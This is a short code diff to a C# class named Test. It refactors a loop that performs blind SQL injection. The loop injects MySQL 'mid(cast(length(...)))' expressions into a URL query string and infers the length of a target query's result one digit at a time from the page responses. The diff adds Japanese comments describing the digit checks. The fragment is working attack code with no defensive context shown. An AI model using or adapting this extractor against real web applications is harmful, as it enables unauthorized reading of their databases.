@@ -29,12 +29,11 @@ public class Test
 		string result_s = "";
 		int index = 1;
 		while(true){
-			string html = null;
-			//length check
+			//全桁見たかチェック
 			string test_url = string.Format("{0}?{1}", url, string.Format(query_format, $"mid(cast(length({target_query}) as char),{index},1)=''"));
-			html = await _get_html(test_url);
-			if(check_func(html))
-				break;
+			string html = await _get_html(test_url);
+			if(check_func(html)) break;
+			//現在の桁の数字を取得
 			for(int i = 0x30; i < 0x40; i++){
 				test_url = string.Format("{0}?{1}", url, string.Format(query_format, $"mid(cast(length({target_query}) as char),{index},1)=0x" + i.ToString("X2")));
 				html = await client.GetStringAsync(test_url);
